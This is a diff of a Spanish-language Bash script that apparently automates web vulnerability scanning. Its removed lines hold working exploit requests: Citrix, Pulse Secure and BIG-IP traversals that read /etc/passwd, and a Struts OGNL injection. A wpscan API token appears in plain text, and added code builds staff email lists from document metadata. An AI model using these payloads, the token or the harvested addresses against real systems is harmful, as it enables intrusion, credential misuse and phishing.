-							#grep --color=never "VULNERABLE (actualizar)" logs/vulnerabilidades/"$subdominio"_"$port"_confTLS.txt > .vulnerabilidades/"$subdominio"_"$port"_vulTLS.txt
-							#grep --color=never "VULNERABLE (actualizar)" -m1 -b0 -A9 logs/vulnerabilidades/"$subdominio"_"$port"_confTLS.txt > logs/vulnerabilidades/"$subdominio"_"$port"_vulTLS.txt							 
-							
-							##########################
-							
-						
-							#######  clone site (domain) ####### 						
-							cd webClone
-								echo -e "\t\t[+] Clonando sitio"
-								
-								if [ -d "$subdominio" ]; then # Ya existe el directorio
-									echo -e "\t\t[+] Ya clonamos este sitio"
-								else
-									wget -mirror --convert-links -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate https://$subdominio 2>/dev/null
-									rm index.html.orig 2>/dev/null
-								fi
-								
-							cd ..						
-							###################################												
+							enumeracionCMS "https" $subdominio $port																						
+							testSSL "https" $subdominio $port													
 						else
 								echo -e "\t\t[+] Redirección, error de proxy detectado o sitio ya escaneado \n"	
 						fi														
@@ -3202,268 +3631,28 @@ then
 				if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios								
 					echo "Realizando tests adicionales " 
 					echo $checksumline >> webClone/checksumsEscaneados.txt
-					if [ $internet == "s" ]; then 	
-						echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
-						wafw00f https://$ip:$port > logs/enumeracion/"$ip"_"$port"_wafw00f.txt
-						grep "is behind" logs/enumeracion/"$ip"_"$port"_wafw00f.txt > .enumeracion/"$ip"_"$port"_wafw00f.txt
-					fi
-							
 					
-					######## heartbleed (IP) ##########
-					echo -e "\t\t[+] Revisando vulnerabilidad heartbleed"
-					echo "nmap -n -sT -Pn -p $port --script=ssl-heartbleed $ip" > logs/vulnerabilidades/"$ip"_"$port"_heartbleed.txt 2>/dev/null 
-					nmap -Pn -n -sT -Pn -p $port --script=ssl-heartbleed $ip >> logs/vulnerabilidades/"$ip"_"$port"_heartbleed.txt 2>/dev/null 
-					egrep -qi "VULNERABLE" logs/vulnerabilidades/"$ip"_"$port"_heartbleed.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]] ; then						
-						echo -e "\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
-						grep "|" logs/vulnerabilidades/"$ip"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_"$port"_heartbleed.txt				
-						heartbleed.py $ip -p $port 2>/dev/null | head -150 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' |  awk  '{print  $18}' > .vulnerabilidades/"$ip"_"$port"_heartbleedRAM.txt
-						heartbleed.sh $ip $port &
-					else
-						echo -e "\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
-					fi
-					###################################	
-					
-					
-					#######  Configuracion TLS/SSL (ip) ######						
-					echo -e "\t\t\t[+] Revisando configuracion TLS/SSL"
-					
-					#testssl.sh --color 0  "https://$ip:$port" > logs/vulnerabilidades/"$ip"_"$port"_confTLS.txt 2>/dev/null 					
-					#grep --color=never "incorrecta" logs/vulnerabilidades/"$ip"_"$port"_confTLS.txt | egrep -vi "Vulnerable a" > .vulnerabilidades/"$ip"_"$port"_confTLS.txt
-					#grep --color=never -i "Vulnerable a" logs/vulnerabilidades/"$ip"_"$port"_confTLS.txt > .vulnerabilidades/"$ip"_"$port"_vulTLS.txt							
-													
-					
-					##########################
-				
-					#######  drupal (domain) ######
-					grep -qi drupal .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 								
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de drupal ($ip)"
-						droopescan scan drupal -u  https://$ip --output json > logs/vulnerabilidades/"$ip"_"$port"_droopescan.txt								
-						cat logs/vulnerabilidades/"$ip"_"$port"_droopescan.txt  > .enumeracion/"$ip"_"$port"_droopescan.txt																																								
-					fi
+					echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
+					wafw00f https://$ip:$port > logs/enumeracion/"$ip"_"$port"_wafw00f.txt
+					grep "is behind" logs/enumeracion/"$ip"_"$port"_wafw00f.txt > .enumeracion/"$ip"_"$port"_wafw00f.txt
 
-					#######  wordpress (IP) ######
-					grep -qi wordpress .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						echo -e "\t\t[+] Revisando vulnerabilidades de wordpress"
-						wpscan  --update																		
-						
-						wpscan --disable-tls-checks --enumerate u  --random-user-agent --url https://$ip --disable-tls-checks --format json  > logs/vulnerabilidades/"$ip"_"$port"_wpUsers.txt
-						wpscan --disable-tls-checks --random-user-agent --url https://$ip/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U --disable-tls-checks  > .enumeracion/"$ip"_"$port"_wpscanPlugins.txt
-								
-						grep "Title" .enumeracion/"$ip"_"$port"_wpscanPlugins.txt | cut -d ":" -f2 > .vulnerabilidades/"$ip"_"$port"_pluginDesactualizado.txt
-						grep "XML-RPC seems" logs/vulnerabilidades/"$ip"_"$port"_wpscan.txt | awk '{print $7}' > .vulnerabilidades/"$ip"_"$port"_configuracionInseguraWordpress.txt
-						cat logs/vulnerabilidades/"$ip"_"$port"_wpUsers.txt | wpscan-parser.py > .vulnerabilidades/"$ip"_"$port"_wpUsers.txt
-					fi
-					###########################	
-					
-					#######  citrix (ip) ######
-					grep -qi citrix .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 													
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($ip)"
-							
-						CVE-2019-19781.sh $ip $port "cat /etc/passwd" > logs/vulnerabilidades/"$ip"_"$port"_citrixVul.txt
-						egrep --color=never "root" logs/vulnerabilidades/"$ip"_"$port"_citrixVul.txt > .vulnerabilidades/"$ip"_"$port"_citrixVul.txt
-						
-					fi
-					###################################	
-					
-					#######  Pulse secure (ip) ######
-					grep -qi pulse .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 													
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($ip)"
-							
-						curl --path-as-is -s -k "https://$ip/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$ip"_"$port"_pulseVul.txt
-						egrep --color=never ":x:" logs/vulnerabilidades/"$ip"_"$port"_pulseVul.txt > .vulnerabilidades/"$ip"_"$port"_pulseVul.txt
-								
-					fi
-					###################################		
-					
-					
-					#######  Cisco (ip) ######
-					grep -qi ciscoASA .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de Cisco ASA/ Firepower ($ip)"
-						
-						firepower.pl -host $ip -port $port  > logs/vulnerabilidades/"$ip"_"$port"_firepower.txt
-						egrep --color=never "INTERNAL_PASSWORD_ENABLED" logs/vulnerabilidades/"$ip"_"$port"_firepower.txt > .vulnerabilidades/"$ip"_"$port"_firepower.txt
-						
-					fi
-					###################################		
-					
-					
-					#######  BIG-IP F5 (domain) ######
-					grep -qi "BIG-IP" .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 								 					
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($ip)"
-						
-						curl --path-as-is -s -k "https://$ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$ip"_"$port"_bigIPVul.txt
-						egrep --color=never ":x:" logs/vulnerabilidades/"$ip"_"$port"_bigIPVul.txt > .vulnerabilidades/"$ip"_"$port"_bigIPVul.txt
-						
-					fi
-					###################################
-					
-					
-					#######  OWA (ip) ######
-					egrep -qi "Outlook|owa" .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 													
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($ip)"
-						
-						owa.pl -host $ip -port $port  > logs/vulnerabilidades/"$ip"_"$port"_owaVul.txt
-						egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$ip"_"$port"_owaVul.txt > .vulnerabilidades/"$ip"_"$port"_owaVul.txt
-						
-					fi
-					###################################	
-
-					#######  grafana (domain) ######
-					egrep -qi "Grafana" .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						echo -e "\t\t\t[+] Revisando vulnerabilidades de Grafana($ip)"
-						
-						grafana.py -H $ip -p $port  > logs/vulnerabilidades/"$ip"_"$port"_grafana.txt 2>/dev/null
-						egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$ip"_"$port"_grafana.txt > .vulnerabilidades/"$ip"_"$port"_grafana.txt
-						
-					fi
-					###################################					
-				
-					#######  joomla (IP) ######
-					grep -qi joomla .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 										
-						echo -e "\t\t[+] Revisando vulnerabilidades de joomla"
-						joomscan.sh -u https://$ip/ | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$ip"_"$port"_joomscan.txt &
-						JoomlaJCKeditor.py --url "https://$ip" > .vulnerabilidades/"$ip"_"$port"_JoomlaJCKeditor.txt
-					fi
-					###################################	
-				
-					#######  WAMPSERVER (ip) ######
-					grep -qi WAMPSERVER .enumeracion/"$ip"_"$port"_webData.txt
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 										
-						echo -e "\t[+] Enumerando WAMPSERVER"
-						wampServer.pl -url https://$ip/ > .enumeracion/"$ip"_"$port"_WAMPSERVER.txt &
-					fi
-					###################################	
-					
+					echo -e "\t\t[+] datos $ip $port "		
+					testSSL "https" $ip $port				
+					enumeracionCMS "https" $ip $port							
 																							
 					#######  if the server is apache ######
 					egrep -i "apache|nginx|kong" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
 					greprc=$?				
-					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes
-						
-						#  CVE-2021-4177
-						echo -e "\t\t[+] Revisando apache traversal)" 
-						apache-traversal.py  --target  $ip --port $port > logs/vulnerabilidades/"$ip"_"$port"_apacheTraversal.txt  	
-						grep --color=never ":x:" logs/vulnerabilidades/"$ip"_"$port"_apacheTraversal.txt  > .vulnerabilidades/"$ip"_"$port"_apacheTraversal.txt
-
-						echo -e "\t\t[+] Revisando directorios ( $ip Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m folders -s 1 -q 1 >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
-						sleep 1
-						echo -e "\t\t[+] Revisando  paneles administrativos ( $ip Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m admin -s 1 -q 1 > logs/enumeracion/"$ip"_"$port"_admin.txt 
-						egrep --color=never "^200|^401" logs/enumeracion/"$ip"_"$port"_admin.txt  >> .enumeracion/"$ip"_"$port"_admin.txt 
-						sleep 1
-						echo -e "\t\t[+] Revisando archivos comunes de servidor ($ip - Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" > .enumeracion/"$ip"_"$port"_webarchivos.txt  &
-						#web-buster.pl -t $ip -p $port -h $hilos_web -d / -m webserver -s 1 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt
-						#egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
-						sleep 1
-						echo -e "\t\t[+] Revisando backups de archivos de configuración ($ip - Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m backupApache -s 1 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt  
-						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt  >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando backups de archivos genericos ($ip - Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m files -s 1 -q 1 | egrep --color=never "^200" > .enumeracion/"$ip"_"$port"_webarchivos.txt  &
-						#web-buster.pl -t $ip -p $port -h $hilos_web -d / -m files -s 1 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt  
-						#egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt  >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando backups de archivos de PHP2 ($ip - Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h 40 -d / -m php -s 1 -q 1 >  logs/enumeracion/"$ip"_"$port"_webarchivos.txt
-						egrep --color=never "^200" logs/enumeracion/"$ip"_"$port"_webarchivos.txt >> .enumeracion/"$ip"_"$port"_webarchivos.txt
-						sleep 1	
-						
-						if [ $internet == "s" ]; then 
-							egrep -i "is behind" .enumeracion/"$ip"_"$port"_wafw00f.txt 2>/dev/null
-							greprc=$?
-							if [[ $greprc -ne 0 ]];then # si hay no hay firewall protegiendo la app								
-								echo -e "\t\t[+] Revisando archivos CGI ($ip -Apache/nginx)"
-								web-buster.pl -t $ip -p $port -h $hilos_web -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt  
-								sleep 1						
-							fi	
-						else
-							echo -e "\t\t[+] Revisando archivos CGI ($ip -Apache/nginx)"
-							web-buster.pl -t $ip -p $port -h $hilos_web -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt  
-							sleep 1													
-						fi	
-																				
-						
-						echo -e "\t\t[+] Revisando archivos peligrosos ($ip - Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m files2 -s 1 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt  
-						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt  | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando si el registro de usuarios esta habilitado ($ip - Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m registroHabilitado -s 1 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_registroHabilitado.txt 
-						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_registroHabilitado.txt  | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_registroHabilitado.txt
-						sleep 1	
-								
-						echo -e "\t\t[+] Revisando archivos por defecto ($ip - Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m default -s 1 -q 1 | egrep --color=never "^200"  | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_archivosDefecto.txt  &
-						#web-buster.pl -t $ip -p $port -h $hilos_web -d / -m default -s 1 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_archivosDefecto.txt  
-						#egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_archivosDefecto.txt  | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_archivosDefecto.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando la existencia de backdoors ($ip - Apache/nginx)"	
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m backdoorApache -s 1 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_webshell.txt  
-						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_webshell.txt  | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_webshell.txt  
-						sleep 1
-						echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($ip - Apache/nginx)"						
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m information -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null &
+					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes						
+						enumeracionApache "https" $ip $port
 					fi						
 					####################################
 		
 					#######  if the server is IIS ######
 					grep -qi IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" 
 					greprc=$?
-					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes					
-						echo -e "\n### $ip:$port ( IIS - HTTPsys)"
-						nmap -n -sT -Pn -p $port --script http-vuln-cve2015-1635 $ip > logs/vulnerabilidades/"$ip"_"$port"_HTTPsys.txt 2>/dev/null 
-						grep "|" logs/vulnerabilidades/"$ip"_"$port"_HTTPsys.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_"$port"_HTTPsys.txt 
-						
-						echo -e "\t\t[+] Revisando directorios  (IIS)"					
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m folders -s 1 -q 1 >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
-						sleep 1
-						echo -e "\t\t[+] Revisando paneles administrativos ($ip - IIS)"	
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m admin -s 1 -q 1 > logs/enumeracion/"$ip"_"$port"_admin.txt 
-						egrep --color=never "^200|^401" logs/enumeracion/"$ip"_"$port"_admin.txt  >> .enumeracion/"$ip"_"$port"_admin.txt 
-						sleep 1
-						echo -e "\t\t[+] Revisando archivos comunes de servidor ($ip - IIS)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
-						sleep 1
-						echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($ip - IIS)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m sharepoint -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt  
-						sleep 1
-						echo -e "\t\t[+] Revisando archivos comunes de webservices ($ip - IIS)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m webservices -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt 
-						sleep 1
-						echo -e "\t\t[+] Revisando la existencia de backdoors ($ip - IIS)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m backdoorIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/"$ip"_"$port"_webshell.txt 
-						sleep 1
-						echo -e "\t\t[+] Revisando backups de archivos de configuración ($ip - IIS)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m backupIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/"$ip"_"$port"_webshell.txt 
-										
+					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes											
+						enumeracionIIS "https" $ip $port																
 					fi
 									
 					####################################
@@ -3472,32 +3661,18 @@ then
 					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found" 
 					greprc=$?				
 					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es JAVA y no se enumero antes				
-						echo -e "\t\t[+] Revisando Apache struts"					
-						curl --insecure --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "https://$ip:$port/" > logs/vulnerabilidades/"$ip"_"$port"_apacheStruts.txt 2>/dev/null
-						grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$ip"_"$port"_apacheStruts.txt > .vulnerabilidades/"$ip"_"$port"_apacheStruts.txt																												  
-						
-						echo -e "\t\t[+] Revisando directorios  ($ip - tomcat)"	
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m folders -s 1 -q 1 >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
-						sleep 1
-						echo -e "\t\t[+] Revisando archivos comunes de tomcat  ($ip - tomcat)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m tomcat -s 1 -q 1 > logs/enumeracion/"$ip"_"$port"_webarchivos.txt 
-						egrep --color=never "^200|^401" logs/enumeracion/"$ip"_"$port"_webarchivos.txt  >> .enumeracion/"$ip"_"$port"_webarchivos.txt 
-						sleep 1
-						echo -e "\t\t[+] Revisando archivos comunes de servidor  ($ip - tomcat)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt
-						sleep 1						
+						enumeracionTomcat "https" $ip $port																				
 					fi									
 					####################################								
 				fi # fin si no hay redireccion http --> https
-								
-					
+													
 				break
 			else
 				perl_instancias=`ps aux | grep perl | wc -l`
 				echo -e "\t[-] Poca RAM ($free_ram Mb) ó maximo número de instancias de perl ($perl_instancias) "
 				sleep 3
 			fi
-    	done	# done true					
+    	done	# done true			
    done #for
    
 	################# si hay menos de 12 scripts de perl continua el script ##############
@@ -3512,189 +3687,90 @@ then
 			break
 		fi
 	done	
-	#################################################################################		
-	#insert clean data		   	
-fi
 
 
 
+	############################################################################
+	echo -e "[+] Extraer metadatos de sitios clonados"										
+	exiftool archivos > logs/enumeracion/"$DOMINIO_EXTERNO"_metadata_exiftool.txt
+	egrep -i "Author|creator" logs/enumeracion/"$DOMINIO_EXTERNO"_metadata_exiftool.txt | awk '{print $3}' | egrep -iv "tool|adobe|microsoft|PaperStream|Acrobat|JasperReports|Mozilla" |sort |uniq  > .enumeracion/"$DOMINIO_EXTERNO"_metadata_exiftool.txt
 
-cd webClone
-	echo -e "[+] Extrayendo URLs de todos los sitios clonados"
-	grep --color=never -irao "http://[^ ]*"  * 2>/dev/null | cut -d ":" -f3 | grep --color=never -ia "$DOMINIO" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt
-	lines=`wc -l http.txt  | cut -d " " -f1`
-	perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
-	paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/"$DOMINIO"_web_wget2.txt
-	rm http.txt 2>/dev/null
-				
-	grep --color=never -irao "https://[^ ]*"  * 2>/dev/null | cut -d ":" -f3 | grep --color=never -ia "$DOMINIO" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt
-	lines=`wc -l https.txt  | cut -d " " -f1`
-	perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
-	paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/"$DOMINIO"_web_wget2.txt
-	rm https.txt 2>/dev/null
-				 
-				
-						
-	echo -e "[+] Buscando archivos sin extension"
-	find . -type f ! \( -iname \*.pdf -o -iname \*.html -o -iname \*.htm -o -iname \*.doc -o -iname \*.docx -o -iname \*.xls -o -iname \*.ppt -o -iname \*.pptx -o -iname \*.xlsx -o -iname \*.js -o -iname \*.PNG  -o -iname \*.txt  -o -iname \*.css  -o -iname \*.php -o -iname \*.orig \) > archivos-sin-extension.txt
-	contador=1
-	mkdir documentos_renombrados 2>/dev/null
-	for archivo in `cat archivos-sin-extension.txt`;
-	do 		
-		tipo_archivo=`file $archivo`
-		# tipos de archivos : https://docs.microsoft.com/en-us/previous-versions//cc179224(v=technet.10)
-		if [[ ${tipo_archivo} == *"PDF"*  ]];then 													
-			mv $archivo documentos_renombrados/$contador.pdf 
-		fi		
-	 
-		if [[ ${tipo_archivo} == *"Creating Application: Microsoft Word"*  ]];then 												
-			mv $archivo documentos_renombrados/$contador.doc 
-		fi		
-		
-		if [[ ${tipo_archivo} == *"Microsoft Word 2007"*  ]];then 												
-			mv $archivo documentos_renombrados/$contador.docx 
-		fi		
-	 
-		if [[ ${tipo_archivo} == *"Creating Application: Microsoft Excel"*  ]];then 				
-			mv $archivo documentos_renombrados/$contador.xls 
-		fi				 
-	 
-		if [[ ${tipo_archivo} == *"Office Excel 2007"*  ]];then 							
-			mv $archivo documentos_renombrados/$contador.xlsx 
+	##### Reporte metadatos (sitio web) ##
+	sed 's/ /-/g' -i .enumeracion/"$DOMINIO_EXTERNO"_metadata_exiftool.txt # cambiar espacios por "-"
+	echo "Nombre;Apellido;Correo;Cargo" > reportes/correos_metadata.csv
+	for nombreCompleto in `more .enumeracion/"$DOMINIO_EXTERNO"_metadata_exiftool.txt`; do	
+	#echo "nombreCompleto $nombreCompleto"
+		if [[ ${nombreCompleto} == *"-"*  ]];then 			
+			nombre=`echo $nombreCompleto | cut -f1 -d "-"`
+			apellido=`echo $nombreCompleto | cut -f2 -d "-"`
+			echo "$nombre;$apellido;$apellido@$DOMINIO_EXTERNO;n/a" > reportes/correos_metadata.csv 
 		fi
-	 		 
-		if [[ ${tipo_archivo} == *"Creating Application: Microsoft PowerPoint"*  ]];then 								
-			mv $archivo documentos_renombrados/$contador.ppt 
-		fi	
-	 		 
-		if [[ ${tipo_archivo} == *"Office PowerPoint 2007"*  ]];then 				
-			mv $archivo documentos_renombrados/$contador.pptx 
-		fi		
-	 
-		if [[ ${tipo_archivo} == *"RAR archive data"*  ]];then 						
-			mv $archivo documentos_renombrados/$contador.rar 
-		fi		
-		let "contador=contador+1"	 
-	done # fin revisar archivos sin extension
-	
-	#### mover archivos con metadata para extraerlos ########
-	echo -e "[+] Extraer metadatos con exiftool"										
-	find . -name "*.pdf" -exec mv {} "../archivos" \;
-	find . -name "*.xls" -exec mv {} "../archivos" \;
-	find . -name "*.doc" -exec mv {} "../archivos" \;
-	find . -name "*.ppt" -exec mv {} "../archivos" \;
-	find . -name "*.pps" -exec mv {} "../archivos" \;
-	find . -name "*.docx" -exec mv {} "../archivos" \;
-	find . -name "*.pptx" -exec mv {} "../archivos" \;
-	find . -name "*.xlsx" -exec mv {} "../archivos" \;
-	
-						
-	######### buscar IPs privadas
-	echo -e "\t\t\t[+] Revisando si hay divulgación de IPs privadas"	
-	grep -ira "192.168." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO"_web_IPinterna.txt
-	grep -ira "172.16." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO"_web_IPinterna.txt
-							
-	grep -ira "http://172." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO"_web_IPinterna.txt
-	grep -ira "http://10." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO"_web_IPinterna.txt
-	grep -ira "http://192." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO"_web_IPinterna.txt
+	done
+	################
 
-	grep -ira "https://172" * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO"_web_IPinterna.txt
-	grep -ira "https://10." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO"_web_IPinterna.txt
-	grep -ira "https://192." * | grep -v "checksumsEscaneados" | sort | uniq >> ../.vulnerabilidades/"$DOMINIO"_web_IPinterna.txt
-	###############################	
-	
-	######### buscar links de amazon EC2
-	grep --color=never -ir 'amazonaws.com' * >> ../.enumeracion/"$DOMINIO"_web_amazon.txt
-	
-	######### buscar comentarios 
-	echo -e "\t\t\t[+] Revisando si hay comentarios html, JS"	
-	grep --color=never -ir '// ' * | egrep -v "http|https|header|footer|div|class" >> ../.enumeracion/"$DOMINIO"_web_comentario.txt
-	grep --color=never -r '<!-- ' * | egrep -v "header|footer|div|class" >> ../.enumeracion/"$DOMINIO"_web_comentario.txt
-	grep --color=never -r ' \-\->' * | egrep -v "header|footer|div|class" >> ../.enumeracion/"$DOMINIO"_web_comentario.txt
